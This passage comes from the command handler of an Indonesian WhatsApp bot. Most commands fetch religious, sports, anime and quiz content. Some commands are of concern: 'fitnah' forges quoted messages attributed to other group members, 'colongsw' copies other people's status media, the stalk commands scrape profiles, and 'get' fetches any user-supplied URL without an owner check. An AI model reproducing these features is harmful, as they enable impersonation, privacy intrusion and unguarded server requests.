				teks += `Ayat : ${i.ayat}\nArab : ${i.arab}\nIndonesia : ${i.indonesia}\nLatin : ${i.latin}\n=================\n`
				suara = await getBuffer(i.audio)
				dp.sendMessage(from, suara, audio, {mimetype: 'audio/mp3', filename: `${millah.surah}.mp3`, quoted: ftroli})
				}
                arifi.sendMessage(from, halal, text, {quoted: ftroli})
                reply(teks.trim())                
                limitAdd(sender, limit)
                break
                case 'quranaudio': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                if (args.length < 1) return reply(`surah keberapa bang?\ncontoh : ${prefix + command} 6`)
                reply('[❗] Sabar Lagi Ngirim Audionya')
                surah = args.join(' ')
                halal = await getBuffer(`https://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=${lolkey}`)
                arifi.sendMessage(from, halal, audio, { mimetype: 'audio/mp4', filename: `${command}.mp3`, quoted: ftroli})                
              limitAdd(sender, limit)
                  break
                case 'jadwalsholat': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
          		reply(mess.wait)
                daerah = args.join(' ')
                jad = await fetchJson(`http://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${lolkey}`)
                wal = jad.result
                sholat = `Wilayah : ${wal.wilayah}\nTanggal : ${wal.tanggal}\nSahur : ${wal.sahur}\nImsak : ${wal.imsak}\nSubuh : ${wal.subuh}\nTerbit : ${wal.terbit}\nDhuha : ${wal.dhuha}\nDzuhur : ${wal.dzuhur}\nAshar : ${wal.ashar}\nMaghrib : ${wal.maghrib}\nIsya : ${wal.isya}`
                arifi.sendMessage(from, sholat, text, {quoted: ftroli})                
               limitAdd(sender, limit)
                 break 
                case 'jadwalbola': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
         		reply(mess.wait)
                get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwalbola?apikey=${lolkey}`)
                get_result = get_result.result
                ini_txt = 'Jadwal Bola :\n'
                for (var x of get_result) {
                ini_txt += `Hari : ${x.hari}\n`
                ini_txt += `Jam : ${x.jam}\n`
                ini_txt += `Event : ${x.event}\n`
                ini_txt += `Match : ${x.match}\n`
                ini_txt += `TV : ${x.tv}\n\n`
                }
                reply(ini_txt)
               limitAdd(sender, limit)
                 break
                case 'niatsholat':
                //[❗] case by DappaGanz 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
             	reply(mess.wait)
                sholatapa = args.join(' ')
                ni = await fetchJson(`https://api.lolhuman.xyz/api/niatsholat/${sholatapa}?apikey=${lolkey}`)
                at = ni.result
                sholat = `Nama : ${at.name}\nArab : ${at.ar}\nLatin : ${at.latin}\nIndonesia : ${at.id}`
                arifi.sendMessage(from, sholat, text, {quoted: ftroli})              
              limitAdd(sender, limit)
                  break
                case 'listkota': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
         		reply(mess.wait)
                kota = await fetchJson(`https://api.lolhuman.xyz/api/sholat/kota?apikey=${lolkey}`)
                teks = '=================\n'
				for (let i of kota.result) {
				teks += `Id : ${i.id}\nLokasi : ${i.lokasi}\n=================\n`
				}
                reply(teks.trim())
                limitAdd(sender, limit)
                break 
                
             case 'asmaulhusna': 
             if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `No : ${get_result.index}\n`
                    ini_txt += `Latin: ${get_result.latin}\n`
                    ini_txt += `Arab : ${get_result.ar}\n`
                    ini_txt += `Indonesia : ${get_result.id}\n`
                    ini_txt += `English : ${get_result.en}`
                    reply(ini_txt)
                    limitAdd(sender, limit)
                    break
                case 'kisahnabi': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                if (args.length < 1) return reply(`nabi apa bang?\ncontoh : ${prefix + command} Muhammad`)
				reply(mess.wait)
                nabi = args.join(' ')
                ki = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${nabi}?apikey=${lolkey}`)
                sah = ki.result
                paranabi = `Nama : ${sah.name}\nTahun Kelahiran : ${sah.thn_kelahiran}\nUmur : ${sah.age}\nLahir Di : ${sah.place}\nCerita : ${sah.story}`
                arifi.sendMessage(from, paranabi, text, {quoted: ftroli})                              
            limitAdd(sender, limit)
                    break
       
                case 'bcgif': 
                if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
				if (args.length < 1) return reply('.......')
				anu = await arifi.chats.all()
				if (isMedia && !rojak.message.videoMessage || isQuotedVideo) {
				let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(rojak).replace('quotedM','m')).message.extendedTextMessage.contextInfo : rojak
				bc = await arifi.downloadMediaMessage(encmedia)
				for (let _ of anu) {
	     		arifi.sendMessage(_.jid, bc, video, {mimetype: Mimetype.gif,quoted : ftroli,caption: `[ *BROADCAST* ]\n\n${body.slice(7)}`})
				}
				reply('Suksess broadcast')
		    	}
		    	break     
				case 'bcgc':
				if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
         		if (args.length < 1) return reply('pesannya mana?')
				anu = await groupMembers
				nom = anu.participant
			    if (isMedia && !rojak.message.videoMessage || isQuotedImage) {
				let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(cok).replace('quotedM','m')).message.extendedTextMessage.contextInfo : rojak
				bufferzzz = await arifi.downloadMediaMessage(encmedia)
				for (let _ of anu) {
				arifi.sendMessage(_.jid, bufferzzz, image, {caption: `「 BC GROUP 」\n\nDari Grup : ${groupName}\nPengirim : wa.me/${(sender.split('@')[0])}\nPesan : ${body.slice(6)}`})
				}
				reply('')
				} else {
				for (let _ of anu) {
				sendMess(_.jid, `「 BC GROUP 」\n\nDari Grup : ${groupName}\nPengirim : wa.me/${(sender.split('@')[0])}\nPesan : ${body.slice(6)}`)
				}
				reply('Sukses broadcast group')
				}
				break
      case 'voting':
        if (!isGroupAdmins && !rojak.key.fromMe) return;
        if (!isGroup) return reply(mess.only.group);
        if (isVote) return reply('Sesi Voting Sedang Berlangsung Di Grup Ini');
        if (!q)
          return reply(
            '*Voting*\n\n' +
              prefix +
              'voting @tag target | reason  | 1 (1 = 1 Menit)'
          );
        if (
          rojak.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 ||
          rojak.message.extendedTextMessage.contextInfo == null
        ) {
          let id = rojak.message.extendedTextMessage.contextInfo.mentionedJid[0];
          split = args.join(' ').replace('@', '').split('|');
          if (!Number(split[2]))
            return reply(
              'masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit'
            );
          await mentions(
            'Vote ' +
              '@' +
              id.split('@')[0] +
              ' Di Mulai' +
              '\n\n' +
              `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,
            [id],
            true
          );
          addVote(from, split[1], split[0], split[2], reply);
        }
        break;
      case 'linkwa':
        if (!q) return reply('cari group apa?');
        hx.linkwa(q).then((result) => {
          let res = '*「 _LINK WA_ 」*\n\n';
          for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`;
          }
          reply(res);
        });
        break;
      case 'igstalk': 
      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
        if (!q) return reply('Usernamenya?');
        let tod = await fetchJson(
          `https://api.dhnjing.xyz/stalk/instagram?user=${q}`
        );
        buff = await getBuffer(tod.result.user_profile_hd);
        let tt = `*INSTAGRAM STALK*
    Username: ${tod.result.username}
    Fullname: ${tod.result.user_fullname}
    Bio: ${tod.result.user_bio}

    Jumlah postingan: ${tod.result.user_post_total}
    Following: ${tod.result.user_following}
    Follower: ${tod.result.user_followers}`;
        arifi.sendMessage(from, buff, image, { quoted: rojak, caption: tt });
        limitAdd(sender, limit)
        break; 
      case 'githubstalk': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!q) return reply('Usernamenya?');
        let oi = await fetchJson(
          `https://api.dhnjing.xyz/stalk/github?user=dehan-j1ng`
        );
        let mm = `*GITHUB STALK*
    Username: ${oi.result.username}
    Fullname: ${oi.result.name}
    Bio: ${oi.result.user_bio}

    Jumlah repo: ${oi.result.user_repo}
    Following: ${oi.result.user_following}
    Follower: ${oi.result.user_followers}`;
        reply(mm);
        limitAdd(sender, limit)
        break;
      case 'tiktokstalk': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!q) return reply('Usernamenya? ');
        var i = await fetchJson(
          `https://api.dhnjing.xyz/stalk/tiktok?user=@${q}`
        );
        buff = await getBuffer(i.result.user.avatarLarger);
        var ii = `*TIKTOK STALK*
    Username: ${q}
    Nickname: ${i.result.user.nickname}
    Bio: ${i.result.user.signature}

    Jumlah postingan: ${i.result.stats.videoCount}
    Following: ${i.result.stats.followingCount}
    Follower: ${i.result.stats.followerCount}`;
        arifi.sendMessage(from, buff, image, { quoted: rojak, caption: ii });
        limitAdd(sender, limit)
        break;
      case 'igstory': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!q) return reply('Usernamenya?');
        hx.igstory(q).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes('mp4')) {
              let link = await getBuffer(i.url);
              arifi.sendMessage(from, link, video, {
                quoted: rojak,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              arifi.sendMessage(from, link, image, {
                quoted: rojak,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        limitAdd(sender, limit)
        break;
      case 'colongsw': //arif 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!rojak.key.fromMe) return;
        if ((isMedia && !rojak.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          owgi = await arifi.downloadAndSaveMediaMessage(ger);
          arifi.sendMessage(sender, fs.readFileSync(owgi), 'imageMessage', {
            caption: q,
          });
          reply('Sukses');
          fs.unlinkSync(owgi);
        } else if ((isMedia && !rojak.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          owgi = await arifi.downloadAndSaveMediaMessage(ger);
          arifi.sendMessage(sender, fs.readFileSync(owgi), 'videoMessage', {
            caption: q,
          });
          reply('Sukses');
          fs.unlinkSync(owgi);
        } else {
          reply('Reply sw foto / video yg mau dicolong');
        }
        break;
      case 'caripesan':  
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
      if (!isPremium) return reply(mess.only.prem)
        if (!q) return reply('pesannya apa bang?');
        let v = await arifi.searchMessages(q, from, 10, 1);
        let s = v.messages;
        let el = s.filter((v) => v.message);
        el.shift();
        try {
          if (el[0].message.conversation == undefined) return;
          reply(`Ditemukan ${el.length} pesan`);
          await sleep(3000);
          for (let i = 0; i < el.length; i++) {
            await arifi.sendMessage(from, 'Nih pesannya', text, {
              quoted: el[i],
            });
          }
        } catch (e) {
          reply('Pesan tidak ditemukan!');
        }
        break;
      case 'lirik': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!q) return reply('lagu apa?');
        let song = await hx.lirik(q);
        sendMediaURL(from, song.foto, song.lirik);
       limitAdd(sender, limit)
         break;
      case 'otaku': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!q) return reply('judul animenya?');
        let anime = await hx.otakudesu(q);
        rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`;
        ram = await getBuffer(anime.img);
        arifi.sendMessage(from, ram, image, { quoted: rojak, caption: rem });
      limitAdd(sender, limit)
          break;
      case 'komiku': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`);
        let komik = await hx.komiku(q);
        result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`;
        sendMediaURL(from, komik.image, result);
     limitAdd(sender, limit)
           break;
      case 'chara': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!q) return reply(`gambar apa?\n${prefix}chara arifi`);
        let im = await hx.chara(q);
        let acak = im[Math.floor(Math.random() * im.length)];
        let li = await getBuffer(acak);
        await arifi.sendMessage(from, li, image, { quoted: rojak });
       limitAdd(sender, limit)
         break; 
          case 'kochou': 
             if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                  //  if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)                    
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${lolkey}&query=kochou shinobu`)
                    ini_url = ini_url.result
                    ini_buffer = await getBuffer(ini_url)
                    await arifi.sendMessage(from, ini_buffer, image, { quoted: rojak })
                  limitAdd(sender, limit)
                      break
      /* case 'waifu': 
       case 'loli':
       case 'husbu':
      case 'milf':
      case 'cosplay':
      case 'naruto':
      case 'wibu':
      case 'aeshtetic':
      case 'wallpaperanime': 
      case 'animefanart': 
      case 'izumisagiri':  
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
           //  if (args.length < 1) return reply(`${prefix}pinterest Nakano Nino`)
              data = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${lolkey}&query=${command}`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(data.result))
              imageMsg = ( await arifi.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`*Hasil Pencarian Dari : ${command}*`,buttons,headerType:4}
              prep = await arifi.prepareMessageFromContent(from,{buttonsMessage},{})
              arifi.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              limitAdd(sender, limit)
              break  */
    
           
        case 'happymod': 
        if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} free fire`)
                    query = args.join(' ')
                    get_result = await fetchJson(`https://api.zeks.xyz/api/happymod?apikey=${zeksapi}&q=${query}`, {method: 'get'})
                    kontol = get_result.result
                    ini_txt = 'Result : \n'
                    for (var x of kontol) {
                        ini_txt += `${x.title}\n`
                        ini_txt += `${x.url}\n\n`
                    }
                    reply(ini_txt)
                    limitAdd(sender, limit)
                    break  
                    case 'nickff': 
                    if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
              		get_result = await fetchJson(`https://api.zeks.xyz/api/nickepep?apikey=${zeksapi}`, {method: 'get'}) 
					get_result = get_result.result
					teks = '=================\n'
					for (let i of get_result) {
						teks += `*Nick* : ${i}\n=================\n`
					}
					reply(teks.trim())		
					limitAdd(sender, limit)
					break
                    
      case 'playstore': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!q) return reply('lu nyari apa?');
        let play = await hx.playstore(q);
        let store = '❉─────────────────────❉\n';
        for (let i of play) {
          store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`;
        }
        reply(store);
        limitAdd(sender, limit)
        break;   
        
       
        
        
      case 'on':
        if (!rojak.key.fromMe) return;
        offline = false;
        fakestatus(' ```ANDA TELAH ONLINE``` ');
        break;
      case 'status': 
      if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
        fakestatus(
          `*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${
            banChats ? '> SELF-MODE' : '> PUBLIC-MODE'
          }\n${prefixStatus ? '> MULTI-PREFIX' : '> NO-PREFIX'}`
        );
        break;
      case 'off':
        if (!rojak.key.fromMe) return;
        offline = true;
        waktu = Date.now();
        anuu = q ? q : '-';
        alasan = anuu;
        fakestatus(' ```ANDA TELAH OFFLINE``` ');
        break;
      case 'get':
        if (!q) return reply('linknya?');
        fetch(`${args[0]}`)
          .then((res) => res.text())
          .then((bu) => {
            fakestatus(bu);
          });
        break;
      case 'kontag': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!rojak.key.fromMe) return reply('SELF-BOT');
        pe = args.join('');
        entah = pe.split('|')[0];
        nah = pe.split('|')[1];
        if (isNaN(entah)) return reply('Invalid phone number');
        members_ids = [];
        for (let mem of groupMembers) {
          members_ids.push(mem.jid);
        }
        vcard =
          'BEGIN:VCARD\n' +
          'VERSION:3.0\n' +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            '+' + entah
          ).getNumber('internasional')}\n` +
          'END:VCARD'.trim();
        arifi.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact,
          { contextInfo: { mentionedJid: members_ids } }
        );
        break;
      case 'sticktag':
        if (
          ((isMedia && !rojak.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          file = await arifi.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(' ');
          var group = await arifi.groupMetadata(from);
          var member = group['participants'];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: rojak,
          };
          ini_buffer = fs.readFileSync(file);
          arifi.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else {
          reply(`*Reply sticker yang sudah dikirim*`);
        }
        break; 
        case 'addprem':
if (!isOwner)return mentions(`*Perintah ini Khusus @${numberNon} !*`, [`${numberNon}@s.whatsapp.net`])
if (!q)return reply(`*Format Error!*\n\n*Example :*\n${unique[0]} *${prefix + command} @tag 10d*\n\n*Note :*\n${unique[0]} s : detik\n${unique[0]} m : menit\n${unique[0]} h : jam\n${unique[0]} d : hari\n\n*Tq To : ${watermark}*`)
expired = q.split(' ')[1]
let pnom = {id: `${q.split(' ')[0].replace('@','')}@s.whatsapp.net`,expired: Date.now() + toMs(expired) }
premium.push(pnom) 
fs.writeFileSync('./database/premium.json',JSON.stringify(premium))
reply(`_Succses_`)
break

case 'delprem':
  if(!isOwner) return reply('Only Owner!')
user = q.split('@')[1] + '@s.whatsapp.net'
for(let i=0; i<premium.length; i++){
if(user.includes(premium[i].id)){
let del = premium.indexOf(premium[i])
premium.splice(del, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
mentions(`Succes delete premium @${user.split('@')[0]}`,[user],true)
}
}
break 


      case 'totag':
        if (
          ((isMedia && !rojak.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          file = await arifi.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(' ');
          var group = await arifi.groupMetadata(from);
          var member = group['participants'];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: rojak,
          };
          ini_buffer = fs.readFileSync(file);
          arifi.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !rojak.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          file = await arifi.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(' ');
          var group = await arifi.groupMetadata(from);
          var member = group['participants'];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: rojak,
          };
          ini_buffer = fs.readFileSync(file);
          arifi.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !rojak.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          file = await arifi.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(' ');
          var group = await arifi.groupMetadata(from);
          var member = group['participants'];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'));
          });
          var options = {
            mimetype: 'audio/mp4',
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: rojak,
          };
          ini_buffer = fs.readFileSync(file);
          arifi.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !rojak.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          file = await arifi.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(' ');
          var group = await arifi.groupMetadata(from);
          var member = group['participants'];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'));
          });
          var options = {
            mimetype: 'video/mp4',
            contextInfo: { mentionedJid: mem },
            quoted: rojak,
          };
          ini_buffer = fs.readFileSync(file);
          arifi.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case 'fitnah': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (args.length < 1)
          return reply(
            `Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`
          );
        var gh = args.join('');
        mentioned = rojak.message.extendedTextMessage.contextInfo.mentionedJid;
        var replace = gh.split('|')[0];
        var target = gh.split('|')[1];
        var bot = gh.split('|')[2];
        arifi.sendMessage(from, `${bot}`, text, {
          quoted: {
            key: {
              fromMe: false,
              participant: `${mentioned}`,
              ...(from ? { remoteJid: from } : {}),
            },
            message: { conversation: `${target}` },
          },
        });
        break;
      case 'settarget': 
      if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
        if (!q) return reply(`${prefix}settarget 628xxxxx`);
        targetpc = args[0];
        fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`);
        break;   
        
     
        case 'tebakgambar':{
  if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (!isGroup) return reply(mess.only.group)
if (game.isTebakGambar(from, tebakgambar)) return reply(`Masih ada soal yang belum di selesaikan`)
let tbg = await axios.get(`https://api.zeks.xyz/api/tebakgambar?apikey=Hadir_hmm`)
let petunjuk = tbg.data.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
sendMediaURL(from, tbg.data.result.soal, monospace(`Silahkan jawab soal berikut ini\n\nPetunjuk : ${petunjuk}\nWaktu : ${gamewaktu}s`), rojak)
let anih = tbg.data.result.jawaban.toLowerCase()
game.addgambar(from, anih, gamewaktu, tebakgambar)
gameAdd(sender, glimit)
	}
break  	 
case 'tebakkata': case 'tk':{
if (!isGroup) return reply(mess.only.group)
if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (game.isTebakKata(from, tebakkata)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/susunkata?apikey=${lolkey}`)
reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.data.result.pertanyaan}\n\nWaktu : ${gamewaktu}s`)
let ahhh = anu.data.result.jawaban.toLowerCase()
game.addkata(from, ahhh, gamewaktu, tebakkata)
gameAdd(sender, glimit)
}
break
case 'tebakkimia': case 'tuk':{
if (!isGroup) return reply(mess.only.group)
if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (game.isTebakKimia(from, tebakkimia)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/unsurkimia?apikey=${lolkey}`)
reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* Lambang unsur ${anu.data.result.nama} adalah?\n\nWaktu : ${gamewaktu}s`)
let revasayank = anu.data.result.lambang.toLowerCase()
game.addkimia(from, revasayank, gamewaktu, tebakkimia)
gameAdd(sender, glimit)
}
break
case 'tebakbendera': case 'tb':{
if (!isGroup) return reply(mess.only.group)
if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (game.isTebakBendera(from, tebakbendera)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/bendera?apikey=${lolkey}`)
let petunjuk = anu.data.result.name.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* Bendera negara manakah itu ${anu.data.result.flag}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu}s`)
let ikasayank = anu.data.result.name.toLowerCase()
game.addbendera(from, ikasayank, gamewaktu, tebakbendera)
gameAdd(sender, glimit)
}
break
case 'tebakanime': case 'ta':{
if (!isGroup) return reply(mess.only.group)
if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (game.isTebakAnime(from, tebakanime)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebakchara?apikey=${lolkey}`)
let petunjuk = anu.data.result.name.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
sendMediaURL(from, anu.data.result.image, monospace(`Silahkan tebak karakter anime berikut ini\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu}s`), rojak)
let nurulsayank = anu.data.result.name.toLowerCase()
game.addanime(from, nurulsayank, gamewaktu, tebakanime)
gameAdd(sender, glimit)
}
break
case 'siapaaku': case 'siapakahaku': case 'sa':{
if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (!isGroup) return reply(mess.only.group)
if (game.isTebakGambar(from, tebakgambar)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/siapaaku?apikey=${lolkey}`)
reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.data.result.question}\n\nWaktu : ${gamewaktu}s`)
let anau = anu.data.result.answer.toLowerCase()
game.addsyiko(from, anau, gamewaktu, siapaaku)
gameAdd(sender, glimit)
}
break
case 'tebaklirik': case 'tl':{
if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (!isGroup) return reply(mess.only.group)
if (game.isTebakLirik(from, tebaklirik)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/lirik?apikey=${lolkey}`)
let petunjuk = anu.data.result.answer.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.data.result.question}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu}s`)
let anal = anu.data.result.answer.toLowerCase()
game.addtebaklirik(from, anal, gamewaktu, tebaklirik)
gameAdd(sender, glimit)
}
break
case 'math':{
